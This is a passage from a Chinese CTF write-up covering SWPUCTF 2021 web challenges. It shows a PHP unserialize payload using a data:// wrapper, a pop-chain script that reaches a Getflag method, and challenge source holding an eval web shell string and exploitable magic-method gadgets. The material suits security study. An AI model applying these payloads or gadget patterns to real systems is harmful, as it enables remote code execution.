<li>&#x7531;&#x4E8E;&#x5DF2;&#x7ECF;&#x5305;&#x542B;&#x4E86;useless.php,&#x6240;&#x4EE5;&#x4F1A;&#x6267;&#x884C;useless.php&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x8FD9;&#x91CC;&#x9762;&#x6709;&#x4E2A;Flag&#x7684;&#x7C7B;&#xFF0C;&#x8003;&#x8651;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;__toString&#x65B9;&#x6CD5;&#x6765;&#x8BFB;&#x53D6;&#x5F53;&#x524D;flag.php&#x6587;&#x4EF6;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x6784;&#x9020;payload</li>
</ul>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</span><br></pre></td></tr></table></div></figure></li>
</ul>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://1.14.71.254:28985/?</span><br><span class="line">text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</span><br></pre></td></tr></table></div></figure>


        <h1 id="SWPUCTF-2021-&#x65B0;&#x751F;&#x8D5B;-pop">
          <a href="#SWPUCTF-2021-&#x65B0;&#x751F;&#x8D5B;-pop" class="heading-link"><i class="fas fa-link"></i></a><a href="#SWPUCTF-2021-&#x65B0;&#x751F;&#x8D5B;-pop" class="headerlink" title="[SWPUCTF 2021 &#x65B0;&#x751F;&#x8D5B;]pop"></a>[SWPUCTF 2021 &#x65B0;&#x751F;&#x8D5B;]pop</h1>
      <ul>
<li>&#x8003;&#x70B9;&#xFF1A;&#x6784;&#x9020;pop&#x94FE;</li>
</ul>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w44m</span></span>{</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$admin</span> = <span class="string">&apos;aaa&apos;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$passwd</span> = <span class="string">&apos;123456&apos;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Getflag</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;admin === <span class="string">&apos;w44m&apos;</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;passwd ===<span class="string">&apos;08067&apos;</span>){</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">&apos;flag.php&apos;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        }<span class="keyword">else</span>{</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;admin;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;passwd;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&apos;nono&apos;</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w22m</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;w00m;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w33m</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w22m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;w00m-&gt;{<span class="variable language_">$this</span>-&gt;w22m}();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="variable">$w00m</span> = <span class="variable">$_GET</span>[<span class="string">&apos;w00m&apos;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$w00m</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>

<p>&#x522B;&#x4EBA;&#x7684;pop&#x94FE;&#x957F;&#x8FD9;&#x6837;</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w44m</span></span>{</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$admin</span> = <span class="string">&apos;w44m&apos;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$passwd</span> = <span class="string">&apos;08067&apos;</span>;</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w22m</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;w00m;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w33m</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w22m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;w00m-&gt;{<span class="variable language_">$this</span>-&gt;w22m}();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">w22m</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;w00m = <span class="keyword">new</span> <span class="title class_">w33m</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;w00m-&gt;w00m=<span class="keyword">new</span> <span class="title class_">w44m</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;w00m-&gt;w22m=<span class="string">&apos;Getflag&apos;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>

<p>&#x7A0D;&#x5FAE;&#x7406;&#x89E3;&#x4E86;&#x4E00;&#x4E0B;&#xFF1A;</p>
<p>&#x6784;&#x9020;pop&#x94FE;&#xFF0C;&#x8981;&#x6C42;&#x5148;&#x77E5;&#x9053;&#x5934;&#xFF08;&#x8981;&#x4F7F;&#x7528;&#x7684;&#x6210;&#x5458;&#x53D8;&#x91CF;&#xFF09;&#xFF0C;&#x77E5;&#x9053;&#x5C3E;&#xFF08;&#x9700;&#x8981;&#x901A;&#x8FC7;pop&#x94FE;&#x7ED5;&#x8FC7;&#x53BB;&#x624D;&#x80FD;&#x4F7F;&#x7528;&#x7684;&#x65B9;&#x6CD5;&#xFF09;&#x3002;&#x3002;&#x3002;</p>
<ul>
<li><p>&#x672C;&#x9898;&#x8981;&#x6C42;&#x7ED5;&#x8FC7;==w44m==&#x7684;<strong>private</strong>&#xFF08;&#x5B8C;&#x5168;&#x79C1;&#x6709;&#xFF0C;&#x5916;&#x90E8;&#x548C;&#x6D3E;&#x751F;&#x7C7B;&#x4E1C;&#x4E0D;&#x80FD;&#x8BBF;&#x95EE;&#xFF09;&#x548C;<strong>protected</strong>&#xFF08;&#x53D7;&#x4FDD;&#x62A4;&#x7684;&#xFF0C;&#x5916;&#x90E8;&#x7C7B;&#x4E0D;&#x80FD;&#x8BBF;&#x95EE;&#xFF09;</p>
<ul>
<li>&#x5728;pop&#x94FE;&#x4E2D;&#xFF0C;&#x8003;&#x8651;&#x6784;&#x9020;&#x4E00;&#x4E2A;&#x65B0;&#x7684;w44m&#x7C7B;&#xFF0C;&#x5176;&#x4E2D;admin &#x548C;passwd&#x662F;public&#x5C5E;&#x6027;</li>
<li>w22m&#x4E0E;w33m&#x7684;&#x7C7B;&#x4E0D;&#x53D8;</li>
</ul>
</li>
<li><p>&#xFF08;&#x53EA;&#x6709;&#x4E00;&#x79CD;&#x4E0D;&#x9760;&#x8C31;&#x7684;&#x601D;&#x8DEF;&#x662F;&#x4ECE;&#x540E;&#x5F80;&#x524D;&#x63A8;&#x3002;&#x3002;&#x53EA;&#x662F;&#x7406;&#x89E3;&#x4E86;&#x6784;&#x9020;&#x597D;&#x7684;&#x94FE;&#x7684;&#x903B;&#x8F91;&#x539F;&#x7406;&#xFF0C;&#x4F46;&#x4E0D;&#x77E5;&#x9053;&#x662F;&#x600E;&#x4E48;&#x60F3;&#x5230;&#x53EF;&#x4EE5;&#x8FD9;&#x4E48;&#x6784;&#x9020;&#x7684;&#xFF09;&#xFF0C;&#x5BF9;pop&#x94FE;&#x5206;&#x6790;</p>
<ul>
<li>w33m&#x63D0;&#x4F9B;&#x4E86;&#x4E00;&#x4E2A;__toString&#x65B9;&#x6CD5;&#xFF0C;&#x5176;&#x529F;&#x80FD;&#x662F;&#x8BA9;&#x4E00;&#x4E2A;&#x6210;&#x5458;&#x80FD;&#x591F;&#x4F7F;&#x7528;&#x67D0;&#x79CD;&#x65B9;&#x6CD5;</li>
</ul>
<blockquote>
<ol>
<li><p>$this-&gt;w00m-&gt;{$this-&gt;w22m}();</p>
<p>(&#x6210;&#x5458;)<code>=========</code>(&#x65B9;&#x6CD5;)</p>
</li>
<li><p><code>$this-&gt;w00m====w44m</code></p>
</li>
<li><p><code>{$this-&gt;w22m}()====w44m====&apos;Getflag()&apos;</code></p>
</li>
</ol>
</blockquote>
</li>
<li><p>&#x7ECF;&#x8FC7;&#x80E1;&#x4E71;&#x5206;&#x6790;&#xFF0C;&#x987A;&#x5E8F;&#x4E3A;w00m&#x2013;&gt;w22m&#x2013;&gt;w33m&#x2013;&gt;w44m&#x2013;&gt;end</p>
</li>
</ul>
<hr>
<blockquote>
<p>&#x6709;&#x4E2A;&#x5C0F;&#x95EE;&#x9898;&#xFF0C;&#x5F53;&#x6210;&#x5458;&#x8BBF;&#x95EE;&#x5C5E;&#x6027;&#x7684;&#x65F6;&#x5019;&#x662F;&#x4E0D;&#x9700;&#x8981;&#x52A0;$&#x7B26;&#x53F7;&#x7684;</p>
<ul>
<li>&#x554A;&#x5BF9;&#x4E86;&#xFF0C;w44m&#x91CC;&#x9762;&#x7684;&#x6210;&#x5458;&#x4E0D;&#x80FD;&#x64C5;&#x81EA;&#x6539;&#x6210;public&#xFF0C;&#x56E0;&#x4E3A;private&#x548C;protected&#x4E24;&#x4E2A;&#x5C5E;&#x6027;&#x5E8F;&#x5217;&#x5316;&#x540E;&#x5206;&#x522B;&#x4F1A;&#x53D8;&#x6210;%00%00&#xFF0C;%00*%00</li>
<li>&#x6216;&#x8005;&#x662F;\x00\x00,\x00*\x00</li>
</ul>
</blockquote>

        <h1 id="SWPUCTF-2021-&#x65B0;&#x751F;&#x8D5B;-babyunser">
          <a href="#SWPUCTF-2021-&#x65B0;&#x751F;&#x8D5B;-babyunser" class="heading-link"><i class="fas fa-link"></i></a><a href="#SWPUCTF-2021-&#x65B0;&#x751F;&#x8D5B;-babyunser" class="headerlink" title="[SWPUCTF 2021 &#x65B0;&#x751F;&#x8D5B;]babyunser"></a>[SWPUCTF 2021 &#x65B0;&#x751F;&#x8D5B;]babyunser</h1>
      <ul>
<li>&#x8003;&#x70B9;&#xFF1A;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#xFF0C;phar,&#x6587;&#x4EF6;&#x4E0A;&#x4F20;</li>
</ul>
<p>&#x67E5;&#x770B;&#x6587;&#x4EF6;&#x7684;&#x6846;&#x91CC;&#x9762;&#x53EF;&#x4EE5;&#x67E5;&#x770B;&#x6E90;&#x7801;&#xFF0C;&#x6709;read.php;class.php;upload.php</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#class.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">aa</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="string">&apos;aa&apos;</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="title function_ invoke__">strtolower</span>(<span class="variable language_">$this</span>-&gt;name);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ff</span></span>{</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$content</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content=<span class="string">&quot;\&lt;?php @eval(\$_POST[1]);?&gt;&quot;</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>{</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$key</span>-&gt;{<span class="variable language_">$this</span>-&gt;func}(<span class="variable">$_POST</span>[<span class="string">&apos;cmd&apos;</span>]);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">zz</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>=<span class="string">&apos;surprise&apos;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span></span>)</span>{</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename=<span class="variable">$filename</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&apos;/^\/|php:|data|zip|\.\.\//i&apos;</span>,<span class="variable language_">$this</span>-&gt;filename)){</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&apos;&#x8FD9;&#x4E0D;&#x5408;&#x7406;&apos;</span>);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$var</span></span>)</span>{</span><br><span class="line">        <span class="variable">$filename</span>=<span class="variable language_">$this</span>-&gt;filename;</span><br><span class="line">        <span class="variable">$lt</span>=<span class="variable language_">$this</span>-&gt;filename-&gt;<span class="variable">$var</span>;</span><br><span class="line">        <span class="comment">//&#x6B64;&#x529F;&#x80FD;&#x5E9F;&#x5F03;&#xFF0C;&#x4E0D;&#x60F3;&#x5199;&#x4E86;</span></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFile</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">filter</span>();</span><br><span class="line">        <span class="variable">$contents</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="variable language_">$this</span>-&gt;filename);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$contents</span>)){</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$contents</span>;</span><br><span class="line">        }<span class="keyword">else</span>{</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;404 not found&quot;</span>);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;{<span class="variable">$_POST</span>[<span class="string">&apos;method&apos;</span>]}(<span class="variable">$_POST</span>[<span class="string">&apos;var&apos;</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;content;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xx</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="string">&apos;eval&apos;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;arg=<span class="string">&apos;phpinfo();&apos;</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$arg</span></span>)</span>{</span><br><span class="line">        <span class="variable">$name</span>(<span class="variable">$arg</span>[<span class="number">0</span>]);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></div></figure>





<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#read.php</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;ie=edge&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;aa&#x7684;&#x6587;&#x4EF6;&#x67E5;&#x770B;&#x5668;&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        .search_form{</span><br><span class="line">            width:<span class="number">602</span>px;</span><br><span class="line">            height:<span class="number">42</span>px;</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*&#x5DE6;&#x8FB9;&#x8F93;&#x5165;&#x6846;&#x8BBE;&#x7F6E;&#x6837;&#x5F0F;*/</span></span><br><span class="line">        .input_text{</span><br><span class="line">            width:<span class="number">400</span>px;</span><br><span class="line">            height: <span class="number">40</span>px;</span><br><span class="line">            border:<span class="number">1</span>px solid green;</span><br><span class="line">            <span class="comment">/*&#x6E05;&#x9664;&#x6389;&#x9ED8;&#x8BA4;&#x7684;padding*/</span></span><br><span class="line">            padding:<span class="number">0</span>px;</span><br><span class="line">            <span class="comment">/*&#x63D0;&#x793A;&#x5B57;&#x9996;&#x884C;&#x7F29;&#x8FDB;*/</span></span><br><span class="line">            text-indent: <span class="number">10</span>px;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/*&#x53BB;&#x6389;&#x84DD;&#x8272;&#x9AD8;&#x4EAE;&#x6846;*/</span></span><br><span class="line">            outline: none;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/*&#x7528;&#x6D6E;&#x52A8;&#x89E3;&#x51B3;&#x5185;&#x8054;&#x5143;&#x7D20;&#x9519;&#x4F4D;&#x53CA;&#x5C0F;&#x95F4;&#x8DDD;&#x7684;&#x95EE;&#x9898;*/</span></span><br><span class="line">            <span class="keyword">float</span>:left;</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        .input_sub{</span><br><span class="line">            width:<span class="number">100</span>px;</span><br><span class="line">            height: <span class="number">42</span>px;</span><br><span class="line">            background: green;</span><br><span class="line">            text-align:center;</span><br><span class="line">            <span class="comment">/*&#x53BB;&#x6389;submit&#x6309;&#x94AE;&#x9ED8;&#x8BA4;&#x8FB9;&#x6846;*/</span></span><br><span class="line">            border:<span class="number">0</span>px;</span><br><span class="line">            <span class="comment">/*&#x6539;&#x6210;&#x53F3;&#x6D6E;&#x52A8;&#x4E5F;&#x662F;&#x53EF;&#x4EE5;&#x7684;*/</span></span><br><span class="line">            <span class="keyword">float</span>:left;</span><br><span class="line">            color:white;<span class="comment">/*&#x641C;&#x7D22;&#x7684;&#x5B57;&#x4F53;&#x989C;&#x8272;&#x4E3A;&#x767D;&#x8272;*/</span></span><br><span class="line">            cursor:pointer;<span class="comment">/*&#x9F20;&#x6807;&#x53D8;&#x4E3A;&#x5C0F;&#x624B;*/</span></span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        .file_content{</span><br><span class="line">            width:<span class="number">500</span>px;</span><br><span class="line">            height: <span class="number">242</span>px;</span><br><span class="line">        }</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&apos;class.php&apos;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">aa</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;aa&#x7684;&#x6587;&#x4EF6;&#x67E5;&#x770B;&#x5668;&lt;/h1&gt;</span><br><span class="line">&lt;form <span class="class"><span class="keyword">class</span>=&quot;<span class="title">search_form</span>&quot; <span class="title">action</span>=&quot;&quot; <span class="title">method</span>=&quot;<span class="title">post</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">class</span>=&quot;<span class="title">input_text</span>&quot; <span class="title">placeholder</span>=&quot;&#x8BF7;&#x8F93;&#x5165;&#x641C;&#x7D22;&#x5185;&#x5BB9;&quot; <span class="title">name</span>=&quot;<span class="title">file</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">value</span>=&quot;&#x67E5;&#x770B;&quot; <span class="title">class</span>=&quot;<span class="title">input_sub</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class"><span class="title">error_reporting</span>(0);</span></span><br><span class="line"><span class="class">$<span class="title">filename</span>=$<span class="title">_POST</span>[&apos;<span class="title">file</span>&apos;];</span></span><br><span class="line"><span class="class"><span class="title">if</span>(!<span class="title">isset</span>($<span class="title">filename</span>))</span>{</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">}</span><br><span class="line"><span class="variable">$file</span>=<span class="keyword">new</span> <span class="title class_">zz</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">getFile</span>();</span><br><span class="line"><span 